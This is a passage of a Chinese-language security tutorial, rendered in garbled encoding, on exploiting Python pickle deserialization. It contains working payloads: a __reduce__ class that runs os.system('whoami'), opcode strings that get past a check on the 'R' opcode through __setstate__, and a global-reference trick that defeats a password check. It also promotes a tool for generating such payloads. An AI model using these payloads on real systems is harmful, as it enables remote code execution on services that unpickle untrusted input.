<p>å½“è§£å°æ—¶ï¼Œå¦‚æœç±»å®šä¹‰äº† <code>__setstate__()</code>ï¼Œå°±ä¼šåœ¨å·²è§£å°çŠ¶æ€ä¸‹è°ƒç”¨å®ƒã€‚æ­¤æ—¶ä¸è¦æ±‚å®ä¾‹çš„ state å¯¹è±¡å¿…é¡»æ˜¯ dictã€‚æ²¡æœ‰å®šä¹‰æ­¤æ–¹æ³•çš„è¯ï¼Œå…ˆå‰å°å­˜çš„ state å¯¹è±¡å¿…é¡»æ˜¯ dictï¼Œä¸”è¯¥ dict å†…å®¹ä¼šåœ¨è§£å°æ—¶èµ‹ç»™æ–°å®ä¾‹çš„ <code>__dict__</code></p>
<p>å¦‚æœ <code>__getstate__()</code> è¿”å› <code>False</code>ï¼Œé‚£ä¹ˆåœ¨è§£å°æ—¶å°±ä¸ä¼šè°ƒç”¨ <code>__setstate__()</code> æ–¹æ³•ã€‚</p>
<p>æ‰€ä»¥å¯ä»¥è¿™ä¹ˆç†è§£ï¼Œpickle æ—¶ï¼ŒPython ä¼šå°å­˜è¯¥å®ä¾‹çš„ <code>__getstate__</code> æ–¹æ³•è¿”å›ç»™å®ƒçš„å€¼ï¼›unpickle æ—¶ï¼ŒPython å°† unpickle åçš„å€¼ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ä¾‹çš„ <code>_setstate_()</code> æ–¹æ³•ã€‚è€Œåœ¨ <code>_setstate_()</code> æ–¹æ³•å†…éƒ¨ï¼Œæ˜¯æŒ‰ç…§äº‹å…ˆè‡ªå®šä¹‰å¥½çš„æµç¨‹æ¥é‡å»ºå®ä¾‹ã€‚</p>
<h5 id="reduce__">__reduce__()</h5>
<p>é™åˆ¶ï¼š</p>
<ol type="1">
<li><code>__reduce__</code> æ–¹æ³•æ˜¯æ–°å¼ç±»ç‰¹æœ‰çš„</li>
</ol>
<p>opcode <code>R</code> å…¶å®å°±æ˜¯ <code>__reduce__()</code></p>
<p><code>__reduce__()</code> æ–¹æ³•ä¸å¸¦ä»»ä½•å‚æ•°ï¼Œå¹¶ä¸”åº”è¿”å›å­—ç¬¦ä¸²æˆ–æœ€å¥½è¿”å›ä¸€ä¸ªå…ƒç»„ï¼ˆè¿”å›çš„å¯¹è±¡é€šå¸¸ç§°ä¸º â€œreduce å€¼â€ï¼‰ã€‚</p>
<p>å¦‚æœè¿”å›å­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²ä¼šè¢«å½“åšä¸€ä¸ªå…¨å±€å˜é‡çš„åç§°ã€‚å®ƒåº”è¯¥æ˜¯å¯¹è±¡ç›¸å¯¹äºå…¶æ¨¡å—çš„æœ¬åœ°åç§°ï¼Œpickle æ¨¡å—ä¼šæœç´¢æ¨¡å—å‘½åç©ºé—´æ¥ç¡®å®šå¯¹è±¡æ‰€å±çš„æ¨¡å—ã€‚è¿™ç§è¡Œä¸ºå¸¸åœ¨å•ä¾‹æ¨¡å¼ä½¿ç”¨ã€‚</p>
<p>å¦‚æœè¿”å›çš„æ˜¯å…ƒç»„ï¼Œåˆ™åº”å½“åŒ…å« 2 åˆ° 6 ä¸ªå…ƒç´ ï¼Œå¯é€‰å…ƒç´ å¯ä»¥çœç•¥æˆ–è®¾ç½®ä¸º Noneã€‚æ¯ä¸ªå…ƒç´ ä»£è¡¨çš„æ„ä¹‰å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li>ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¼šåœ¨åˆ›å»ºå¯¹è±¡çš„æœ€åˆç‰ˆæœ¬æ—¶è°ƒç”¨ã€‚</li>
<li>å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªå…ƒç»„ã€‚å¦‚æœå¯è°ƒç”¨å¯¹è±¡ä¸æ¥å—å‚æ•°ï¼Œå¿…é¡»æä¾›ä¸€ä¸ªç©ºå…ƒç»„ã€‚</li>
<li>å¯é€‰å…ƒç´ ï¼Œç”¨äºè¡¨ç¤ºå¯¹è±¡çš„çŠ¶æ€ï¼Œå°†è¢«ä¼ ç»™å‰è¿°çš„ <code>__setstate__()</code> æ–¹æ³•ã€‚å¦‚æœå¯¹è±¡æ²¡æœ‰æ­¤æ–¹æ³•ï¼Œåˆ™è¿™ä¸ªå…ƒç´ å¿…é¡»æ˜¯å­—å…¸ç±»å‹ï¼Œå¹¶ä¼šè¢«æ·»åŠ è‡³ <code>__dict__</code> å±æ€§ä¸­ã€‚</li>
<li>å¯é€‰å…ƒç´ ï¼Œä¸€ä¸ªè¿”å›è¿ç»­é¡¹çš„è¿­ä»£å™¨ï¼ˆè€Œä¸æ˜¯åºåˆ—ï¼‰ã€‚è¿™äº›é¡¹ä¼šè¢« <code>obj.append(item)</code> é€ä¸ªåŠ å…¥å¯¹è±¡ï¼Œæˆ–è¢« <code>obj.extend(list_of_items)</code> æ‰¹é‡åŠ å…¥å¯¹è±¡ã€‚è¿™ä¸ªå…ƒç´ ä¸»è¦ç”¨äº list çš„å­ç±»ï¼Œä¹Ÿå¯ä»¥ç”¨äºé‚£äº›æ­£ç¡®å®ç°äº† <code>append()</code> å’Œ <code>extend()</code> æ–¹æ³•çš„ç±»ã€‚ï¼ˆå…·ä½“æ˜¯ä½¿ç”¨ <code>append()</code> è¿˜æ˜¯ <code>extend()</code> å–å†³äº pickle åè®®ç‰ˆæœ¬ä»¥åŠå¾…æ’å…¥å…ƒç´ çš„é¡¹æ•°ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªæ–¹æ³•å¿…é¡»åŒæ—¶è¢«ç±»æ”¯æŒï¼‰</li>
<li>å¯é€‰å…ƒç´ ï¼Œä¸€ä¸ªè¿”å›è¿ç»­é”®å€¼å¯¹çš„è¿­ä»£å™¨ï¼ˆè€Œä¸æ˜¯åºåˆ—ï¼‰ã€‚è¿™äº›é”®å€¼å¯¹å°†ä¼šä»¥ <code>obj[key] = value</code> çš„æ–¹å¼å­˜å‚¨äºå¯¹è±¡ä¸­ã€‚è¯¥å…ƒç´ ä¸»è¦ç”¨äº dict å­ç±»ï¼Œä¹Ÿå¯ä»¥ç”¨äºé‚£äº›å®ç°äº† <code>__setitem__()</code> çš„ç±»ã€‚</li>
<li>å¯é€‰å…ƒç´ ï¼Œä¸€ä¸ªå¸¦æœ‰ <code>(obj, state)</code> ç­¾åçš„å¯è°ƒç”¨å¯¹è±¡ã€‚è¯¥å¯è°ƒç”¨å¯¹è±¡å…è®¸ç”¨æˆ·ä»¥ç¼–ç¨‹æ–¹å¼æ§åˆ¶ç‰¹å®šå¯¹è±¡çš„çŠ¶æ€æ›´æ–°è¡Œä¸ºï¼Œè€Œä¸æ˜¯ä½¿ç”¨ obj çš„é™æ€ <code>__setstate__()</code> æ–¹æ³•ã€‚å¦‚æœæ­¤å¤„ä¸æ˜¯ Noneï¼Œåˆ™æ­¤å¯è°ƒç”¨å¯¹è±¡çš„ä¼˜å…ˆçº§é«˜äº obj çš„ <code>__setstate__()</code>ã€‚</li>
</ol>
<p>3.8 æ–°ç‰ˆåŠŸèƒ½: æ–°å¢äº†å…ƒç»„çš„ç¬¬ 6 é¡¹ï¼Œå¯é€‰å…ƒç´  <code>(obj, state)</code></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œå…¶å® pickle å¹¶ä¸ç›´æ¥è°ƒç”¨ä¸Šé¢çš„å‡ ä¸ªå‡½æ•°ã€‚äº‹å®ä¸Šï¼Œå®ƒä»¬å®ç°äº† <code>__reduce__()</code> è¿™ä¸€ç‰¹æ®Šæ–¹æ³•ã€‚å°½ç®¡è¿™ä¸ªæ–¹æ³•åŠŸèƒ½å¾ˆå¼ºï¼Œä½†æ˜¯ç›´æ¥åœ¨ç±»ä¸­å®ç° <code>__reduce__()</code> å®¹æ˜“äº§ç”Ÿé”™è¯¯ã€‚å› æ­¤ï¼Œè®¾è®¡ç±»æ—¶åº”å½“å°½å¯èƒ½çš„ä½¿ç”¨é«˜çº§æ¥å£ï¼ˆæ¯”å¦‚ <code>__getnewargs_ex__()</code>ã€<code>__getstate__()</code> å’Œ <code>__setstate__()</code>ï¼‰ã€‚åé¢ä»ç„¶å¯ä»¥çœ‹åˆ°ç›´æ¥å®ç° <code>__reduce__()</code> æ¥å£çš„çŠ¶å†µï¼Œå¯èƒ½åˆ«æ— ä»–æ³•ï¼Œå¯èƒ½ä¸ºäº†è·å¾—æ›´å¥½çš„æ€§èƒ½ï¼Œæˆ–è€…ä¸¤è€…çš†æœ‰ä¹‹ã€‚</p>
<h5 id="reduce_ex__">__reduce_ex__()</h5>
<p>ä½œä¸ºæ›¿ä»£é€‰é¡¹ï¼Œä¹Ÿå¯ä»¥å®ç° <code>__reduce_ex__()</code> æ–¹æ³•ã€‚æ­¤æ–¹æ³•çš„å”¯ä¸€ä¸åŒä¹‹å¤„åœ¨äºå®ƒæ¥å—ä¸€ä¸ªæ•´å‹å‚æ•°ç”¨äºæŒ‡å®šåè®®ç‰ˆæœ¬ã€‚å¦‚æœå®šä¹‰äº†è¿™ä¸ªå‡½æ•°ï¼Œåˆ™ä¼šè¦†ç›– <code>__reduce__()</code> çš„è¡Œä¸ºã€‚æ­¤å¤–ï¼Œ<code>__reduce__()</code> æ–¹æ³•ä¼šè‡ªåŠ¨æˆä¸ºæ‰©å±•ç‰ˆæ–¹æ³•çš„åŒä¹‰è¯ã€‚è¿™ä¸ªå‡½æ•°ä¸»è¦ç”¨äºä¸ºä»¥å‰çš„ Python ç‰ˆæœ¬æä¾›å‘åå…¼å®¹çš„ reduce å€¼ã€‚</p>
<h4 id="åˆ©ç”¨-__reduce__-è‡ªåŠ¨ç”Ÿæˆ">åˆ©ç”¨ __reduce__() è‡ªåŠ¨ç”Ÿæˆ</h4>
<p>è¿™é‡Œä¸¾ä¸€ä¸ªç®€å•çš„æ‰§è¡Œå‘½ä»¤çš„ demoã€‚</p>
<p>æ˜¾ç„¶ï¼Œåœ¨ä¸Šé¢é‚£ä¹ˆå¤šæ–¹æ³•ä¸­ï¼Œ<code>__reduce__()</code> æ˜¯æˆ‘ä»¬çš„é¦–é€‰æ„é€ æ–¹æ¡ˆï¼Œdemo å¦‚ä¸‹ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&quot;whoami&quot;</span>, ))<br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(serialized)<br><br></code></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š<code>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</code></p>
<p>å½“ç„¶ï¼Œæ–°å¼ç±»æ˜¯ 3.x æ‰æœ‰çš„ã€‚å¦‚æœè¦åœ¨ 2.xï¼ˆ&gt;= 2.2ï¼Œ&lt; 2.2 æ— æ–°å¼ç±»ï¼‰ä½¿ç”¨ <code>__reduce__</code> çš„è¯ï¼Œéœ€è¦æ‰‹åŠ¨æ˜¾å¼ç»§æ‰¿æ–°å¼ç±»ï¼ŒæŠŠ <code>class Test</code> æ”¹ä¸º <code>class Test(object)</code> å³å¯ã€‚</p>
<p>å¦‚æœæ”»å‡»ç›®æ ‡å¯ä»¥ä¼ å…¥ä»»æ„åºåˆ—åŒ–ç»“æœï¼Œé‚£ä¹ˆè¿™ä¸ª payload ç›´æ¥å°±å¯ä»¥ç”Ÿæ•ˆã€‚è¿™ç§æ”»å‡»æœ€ä¸ºç®€å•ï¼Œåœ¨ CTF ä¸­ï¼Œæœ‰åˆ©ç”¨é»‘åå• ban æ‰ system ç­‰ç­‰å‡½æ•°çš„é¢˜ç›®ï¼Œæ€è·¯å°±æ˜¯å¯»æ‰¾é»‘åå•çš„æ¼ç½‘ä¹‹é±¼ã€‚</p>
<h4 id="é¿å…ä½¿ç”¨ç‰¹å®šçš„-opcode">é¿å…ä½¿ç”¨ç‰¹å®šçš„ opcode</h4>
<p>å¦‚æœæ”»å‡»ç›®æ ‡æœ‰å¯¹ä¼ å…¥çš„åºåˆ—åŒ–ç»“æœåšé«˜å± opcode åˆ¤æ–­çš„è¯ï¼Œå¯ä»¥å°è¯•ç”¨ä¸åŒç‰ˆæœ¬çš„åè®®ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/6109c631-07fe-4d16-bfbb-c415ddfc91f1.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/34f6ae5c-5293-4716-aa50-dc1a016a2e89.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>è¿™ç§å·®å¼‚æ€§æˆ–è®¸èƒ½è®©æˆ‘ä»¬ç»•è¿‡ä¸€äº› if åˆ¤æ–­ã€‚ä¸è¿‡ï¼Œè¯¸å¦‚ <code>R</code> è¿™ç§æ¯”è¾ƒå¿…éœ€çš„ opcodeï¼Œä¸€èˆ¬æ˜¯å¾ˆéš¾ç”¨å…¶ä»– opcode æ¥ç›´æ¥ä»£æ›¿çš„ã€‚</p>
<h4 id="souse">souse</h4>
<p>ä¸ºäº†æ–¹ä¾¿æ„é€  Payloadï¼Œæˆ‘å†™äº†ä¸€ä¸ªè‡ªåŠ¨è½¬åŒ–çš„å·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://github.com/Macr0phag3/souse">souse</a>ï¼Œå¯ä»¥å°† Python æºç å½¢å¼çš„ exp è½¬ä¸º opcode å½¢å¼çš„ expï¼Œå¯å†²ï¼</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/help.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ä¸è¿‡ï¼Œåœ¨ç”¨å·¥å…·ä¹‹å‰ä¸€å®šè¦å…ˆçœ‹ä¸‹å¦‚ä½•æ ¹æ®åˆ©ç”¨é“¾æ‰‹æ“ opcodeï¼Œæ¯•ç«Ÿå·¥å…·åªæ˜¯å·¥å…·è€Œå·²ã€‚</p>
<p>ç½‘ä¸Šä¹Ÿæœ‰å¦ä¸€ä¸ªè‡ªåŠ¨æ„é€ å·¥å…·ï¼Œè§èµ„æ–™ 4ã€‚</p>
<h3 id="æ‰‹åŠ¨æ„é€ ">æ‰‹åŠ¨æ„é€ </h3>
<p>æ‰‹åŠ¨æ„é€ éœ€è¦å¯¹ opcode æ¯”è¾ƒäº†è§£ï¼ˆå®é™…ä¸Šç”¨å‡ æ¬¡å°±ç†Ÿç»ƒäº†ï¼‰ã€‚ç”±äºè‡ªåŠ¨æ„é€ çš„æ‰‹æ³•æ‰‹åŠ¨æ„é€ éƒ½å¯ä»¥åšåˆ°ï¼Œæ‰€ä»¥ä¸ºäº†é¿å…å†…å®¹é‡å¤ï¼Œè¿™é‡Œåªåˆ—ä¸¾æ‰‹åŠ¨æ„é€ ç‰¹æœ‰æ”»å‡»çš„æ‰‹æ³•ã€‚</p>
<h4 id="å…¨å±€å¼•ç”¨">å…¨å±€å¼•ç”¨</h4>
<p>ä¸¾ä¸ªä¾‹å­ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(ser)  <span class="hljs-comment"># è¾“å…¥ç‚¹</span><br>        <span class="hljs-keyword">if</span> obj.pwd == secret.pwd:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br></code></pre></td></tr></table></figure></p>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå‡å¦‚æˆ‘å°±æ˜¯æƒ³é€šè¿‡è¿™ä¸ª if æ¥å®Œæˆæ”»å‡»ï¼Œåº”è¯¥æ€ä¹ˆå®ç°å‘¢ï¼Ÿ</p>
<p>å…ˆçœ‹è‡ªåŠ¨æ„é€ ï¼Œæ¯”è¾ƒç›´æ¥çš„æ€è·¯å°±æ˜¯ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">secret</span>:<br>    pwd = <span class="hljs-string">&quot;???&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.pwd = secret.pwd<br><br>test = Target()<br><br>serialized = pickletools.optimize(pickle.dumps(test, protocol=<span class="hljs-number">0</span>))<br><span class="hljs-built_in">print</span>(serialized)<br><span class="hljs-comment"># ç»“æœ</span><br><span class="hljs-comment"># b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nV???\nsb.&#x27;</span><br></code></pre></td></tr></table></figure></p>
<p>è¿™ä¸ªçŠ¯äº†å’Œä¸Šé¢é‚£ä¸ªå‘½ä»¤æ‰§è¡Œç›¸åŒçš„é”™è¯¯ï¼Œåœ¨å®ä¾‹åŒ– Target çš„æ—¶å€™ï¼Œ<code>self.pwd</code> å°±å·²ç»è¢«èµ‹å€¼å®Œæˆäº†ï¼Œè€Œè¿™è‚¯å®šæ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºä½ ä¸çŸ¥é“ <code>secret.pwd</code> åˆ°åº•æ˜¯å•¥ï¼ˆè¿™é‡ŒåŠ ä¸ª <code>class secret</code> åªæ˜¯ä¸ºäº†ä»£ç å¯ä»¥è¿è¡Œï¼‰ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>c</code> è¿™ä¸ª opcode æ¥å®Œæˆæ”»å‡»ã€‚<code>c</code> å…¶å®å°±æ˜¯ <code>pickle.Unpickler().find_class(module, name)</code>ã€‚</p>
<p>å®ƒçš„ä½œç”¨æ˜¯å¯¼å…¥ module æ¨¡å—å¹¶è¿”å›å…¶ä¸­åå« <code>name</code> çš„å¯¹è±¡ï¼Œå…¶ä¸­ module å’Œ name å‚æ•°éƒ½æ˜¯ str å¯¹è±¡ã€‚æ–‡æ¡£æŒ‡å‡ºï¼Œ<code>find_class()</code> åŒæ ·å¯ä»¥ç”¨æ¥å¯¼å…¥å‡½æ•°ã€‚</p>
<p>æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠæ”»å‡»ç›®æ ‡ç±»ä¸­å¼•ç”¨çš„ <code>secret.pwd</code> ç”¨ <code>c</code> æ‹¿è¿›æ¥ï¼š<br />
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust"># å‰åå¯¹æ¯”<br><span class="hljs-string">b&#x27;ccopy_reg<span class="hljs-char escape_">\n</span>_reconstructor<span class="hljs-char escape_">\n</span>(c__main__<span class="hljs-char escape_">\n</span>Target<span class="hljs-char escape_">\n</span>c__builtin__<span class="hljs-char escape_">\n</span>object<span class="hljs-char escape_">\n</span>NtR(dVpwd<span class="hljs-char escape_">\n</span>V???<span class="hljs-char escape_">\n</span>sb.&#x27;</span><br><br><span class="hljs-string">b&#x27;ccopy_reg<span class="hljs-char escape_">\n</span>_reconstructor<span class="hljs-char escape_">\n</span>(c__main__<span class="hljs-char escape_">\n</span>Target<span class="hljs-char escape_">\n</span>c__builtin__<span class="hljs-char escape_">\n</span>object<span class="hljs-char escape_">\n</span>NtR(dVpwd<span class="hljs-char escape_">\n</span>csecret<span class="hljs-char escape_">\n</span>pwd<span class="hljs-char escape_">\n</span>sb.&#x27;</span><br></code></pre></td></tr></table></figure></p>
<p>ä¸¢è¿›å»çœ‹çœ‹ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/c51474bf-c23b-4402-9773-bcda53d65405.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>nice</p>
<h4 id="å¼•å…¥é­”æœ¯æ–¹æ³•">å¼•å…¥é­”æœ¯æ–¹æ³•</h4>
<p>ä¸¾ä¸ª RCE çš„ä¾‹å­ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        ser = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># è¾“å…¥ç‚¹</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;R&quot;</span> <span class="hljs-keyword">in</span> ser:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hack! &lt;=@_@&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            obj = pickle.loads(ser)<br></code></pre></td></tr></table></figure></p>
<p>å¯¹äºè¿™ä¸ªä¾‹å­æ¥è¯´ï¼Œè¦æƒ³ RCEï¼Œéœ€è¦è¿‡è¿™é‡Œçš„ ifï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ç”¨ <code>R</code>ã€‚</p>
<p>å…ˆæ¥çœ‹ä¸‹å¸¸è§„çš„ payload æ˜¯ä»€ä¹ˆæ ·çš„ï¼š<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cnt<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.<br>                                    ^<br></code></pre></td></tr></table></figure><br />
è¿™ R å¦‚ä½•å»é™¤å‘¢ï¼Ÿ<code>b</code> å°±æ´¾ä¸Šç”¨åœºäº†ã€‚</p>
<p>å›é¡¾ä¸€ä¸‹å®ƒçš„ä½œç”¨ï¼šä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ª å±æ€§å-å±æ€§å€¼ çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§/æ–¹æ³•çš„è®¾ç½®ã€‚æ—¢ç„¶å¯ä»¥è®¾ç½®å®ä¾‹çš„æ–¹æ³•ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½è®¾ç½®ä¸€ä¸ªæ–¹æ³•è®©å®ƒåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨è¿è¡Œå‘¢ï¼Ÿä»€ä¹ˆæ–¹æ³•ä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨è¿è¡Œï¼Œç­”æ¡ˆæ˜¯ä¸Šé¢æåˆ°çš„ <code>__setstate__()</code>ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦ä»¤ <code>__setstate__ = os.system</code>ï¼Œå†æŠŠå‚æ•°ä¼ å…¥å³å¯ï¼š<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">ccopy_reg<span class="hljs-symbol">\n</span>_reconstructor<span class="hljs-symbol">\n</span>(c__main__<span class="hljs-symbol">\n</span>Target<span class="hljs-symbol">\n</span>c__builtin__<span class="hljs-symbol">\n</span>object<span class="hljs-symbol">\n</span>NtR(dV__setstate__<span class="hljs-symbol">\n</span>cos<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>ubVwhoami<span class="hljs-symbol">\n</span>b.<br></code></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯æˆ‘ä»¬æŠŠæ‰§è¡Œå‡½æ•°çš„é‚£ä¸ª R å»æ‰ä¹‹åï¼Œç”±äºè¦æ„å»ºå®ä¾‹ï¼Œåˆå¼•å…¥äº†ä¸€ä¸ªæ–°çš„ Rã€‚ç”¨å‰é¢æåˆ°è¿‡çš„ï¼Œä¿®æ”¹åè®®ç‰ˆæœ¬å³å¯ï¼š<br />
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">\x80\x02c__main__\nTest\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.</span><br><span class="hljs-comment"># pickletools.dis å¦‚ä¸‹</span><br>    <span class="hljs-attr">0:</span> <span class="hljs-string">c</span>    <span class="hljs-string">GLOBAL</span>     <span class="hljs-string">&#x27;__main__ Test&#x27;</span><br>   <span class="hljs-attr">15:</span> <span class="hljs-string">)</span>    <span class="hljs-string">EMPTY_TUPLE</span><br>   <span class="hljs-attr">16:</span> <span class="hljs-string">\x81</span> <span class="hljs-string">NEWOBJ</span><br>   <span class="hljs-attr">17:</span> <span class="hljs-string">&#125;</span>    <span class="hljs-string">EMPTY_DICT</span><br>   <span class="hljs-attr">18:</span> <span class="hljs-string">(</span>    <span class="hljs-string">MARK</span><br>   <span class="hljs-attr">19:</span> <span class="hljs-string">V</span>        <span class="hljs-string">UNICODE</span>    <span class="hljs-string">&#x27;__setstate__&#x27;</span><br>   <span class="hljs-attr">33:</span> <span class="hljs-string">c</span>        <span class="hljs-string">GLOBAL</span>     <span class="hljs-string">&#x27;os system&#x27;</span><br>   <span class="hljs-attr">44:</span> <span class="hljs-string">u</span>        <span class="hljs-string">SETITEMS</span>   <span class="hljs-string">(MARK</span> <span class="hljs-string">at</span> <span class="hljs-number">18</span><span class="hljs-string">)</span><br>   <span class="hljs-attr">45:</span> <span class="hljs-string">b</span>    <span class="hljs-string">BUILD</span><br>   <span class="hljs-attr">46:</span> <span class="hljs-string">V</span>    <span class="hljs-string">UNICODE</span>    <span class="hljs-string">&#x27;whoami&#x27;</span><br>   <span class="hljs-attr">54:</span> <span class="hljs-string">b</span>    <span class="hljs-string">BUILD</span><br>   <span class="hljs-attr">55:</span> <span class="hljs-string">.</span>    <span class="hljs-string">STOP</span><br></code></pre></td></tr></table></figure></p>
<p><code>\x80\x02</code> æ˜¯åè®®çš„ç‰ˆæœ¬å£°æ˜ï¼Œå¯å†™å¯ä¸å†™ï¼Œå†™é”™äº†ä¹Ÿä¸å½±å“ Python è¯†åˆ«ï¼›<code>\x81</code> å…¶å®å°±æ˜¯é€šè¿‡ <code>cls.__new__</code> æ¥åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œéœ€è¦æ ˆé¡¶æœ‰ argsï¼ˆå…ƒç»„ï¼‰ å’Œ kwdsï¼ˆå­—å…¸ï¼‰ã€‚</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/6397d745-ca0b-48ed-a2ee-73b89b8766e5.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h4 id="find_class-é»‘åå•ç»•è¿‡">find_class é»‘åå•ç»•è¿‡</h4>
<p>Python çš„å®˜æ–¹æ–‡æ¡£é‡Œï¼Œæ˜ç¡®è¡¨ç¤ºäº† pickle æ˜¯ä¸ä¿è¯å®‰å…¨æ€§çš„ï¼Œæ‰€ä»¥æ•°æ®ä¸€å®šè¦å¯ä¿¡æ‰èƒ½è¿›è¡Œ unpickle</p>
